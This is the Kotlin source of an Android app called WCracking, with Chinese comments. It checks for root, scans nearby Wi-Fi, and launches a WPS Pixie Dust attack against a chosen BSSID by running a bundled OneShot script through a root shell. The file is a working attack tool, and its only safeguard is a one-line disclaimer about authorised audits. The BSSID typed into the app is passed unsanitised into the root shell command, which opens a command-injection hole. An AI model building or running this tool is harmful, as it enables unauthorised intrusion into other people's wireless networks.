package com.wcracking.app

import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.topjohnwu.superuser.Shell
import java.io.File

/**
 * WCracking 原生 APK 壳（骨架）。
 *
 * 职责：检查 root → 释放内置 OneShot 脚本 → 通过 root shell 调用 OneShot 完成 WPS 攻击，
 *       并把输出回显到界面。
 *
 * 前置条件（见 android/README.md）：
 *   - 已 root（Magisk/KernelSU）
 *   - 已安装 Termux，并 pkg install python wpa-supplicant pixiewps iw openssl
 *
 * 仅限对本人拥有或已获书面授权的网络进行安全审计。
 */
class MainActivity : AppCompatActivity() {

    private lateinit var etBssid: EditText
    private lateinit var tvLog: TextView
    private lateinit var scroll: ScrollView
    private lateinit var btnScan: Button
    private lateinit var btnAttack: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etBssid = findViewById(R.id.et_bssid)
        tvLog = findViewById(R.id.tv_log)
        scroll = findViewById(R.id.scroll_log)
        btnScan = findViewById(R.id.btn_scan)
        btnAttack = findViewById(R.id.btn_attack)

        // 检查 root（libsu 6.x 回调式 API）
        Shell.getShell { shell ->
            runOnUiThread {
                appendLog(if (shell.isRoot) "[+] 已获取 root" else "[-] 未获取 root（WPS 攻击需要 root）")
            }
        }

        // 释放内置脚本
        runCatching { extractAssets() }
            .onSuccess { appendLog("[*] 内置 OneShot 脚本已释放") }
            .onFailure { appendLog("[x] 释放脚本失败: ${it.message}") }

        btnScan.setOnClickListener { scan() }
        btnAttack.setOnClickListener { attack() }
    }

    private fun extractAssets() {
        for (name in listOf("oneshot.py", "vulnwsc.txt")) {
            val dest = File(filesDir, name)
            if (!dest.exists()) {
                assets.open(name).use { input ->
                    dest.outputStream().use { output -> input.copyTo(output) }
                }
            }
        }
    }

    private fun pythonPath(): String {
        // 优先 Termux 的 python3，其次系统 PATH 里的 python3
        val termux = "/data/data/com.termux/files/usr/bin/python3"
        val r = Shell.cmd("command -v $termux").exec()
        return if (r.isSuccess && r.out.isNotEmpty()) termux else "python3"
    }

    private fun scan() {
        appendLog("[*] 扫描 WPS 网络（iw dev wlan0 scan）……")
        runRoot("iw dev wlan0 scan", onLine = { line ->
            // 简易提取 BSSID / SSID
            if (line.contains("BSS ") || line.contains("SSID:")) {
                appendLog("    $line.trim()")
            }
        })
    }

    private fun attack() {
        val bssid = etBssid.text.toString().trim()
        if (bssid.isEmpty()) {
            appendLog("[!] 请先输入目标 BSSID")
            return
        }
        val python = pythonPath()
        val script = File(filesDir, "oneshot.py").absolutePath
        val vuln = File(filesDir, "vulnwsc.txt").absolutePath
        val cmd = "$python $script -i wlan0 -b $bssid --vuln-list $vuln -K"

        appendLog("[*] 开始 Pixie Dust 攻击 $bssid ……")
        appendLog("[*] $cmd")
        btnAttack.isEnabled = false
        runRoot(cmd, onLine = { appendLog(it) }, onDone = { code ->
            btnAttack.isEnabled = true
            appendLog(if (code == 0) "[+] 攻击结束" else "[-] 攻击结束（退出码 $code）")
        })
    }

    /** 在后台线程执行 root 命令，逐行回显。 */
    private fun runRoot(cmd: String, onLine: (String) -> Unit = {}, onDone: (Int) -> Unit = {}) {
        Thread {
            val result = Shell.cmd(cmd).exec()
            val out = result.out
            runOnUiThread {
                out.forEach(onLine)
                onDone(result.code)
            }
        }.start()
    }

    private fun appendLog(msg: String) {
        tvLog.append(msg + "\n")
        scroll.post { scroll.fullScroll(ScrollView.FOCUS_DOWN) }
    }
}
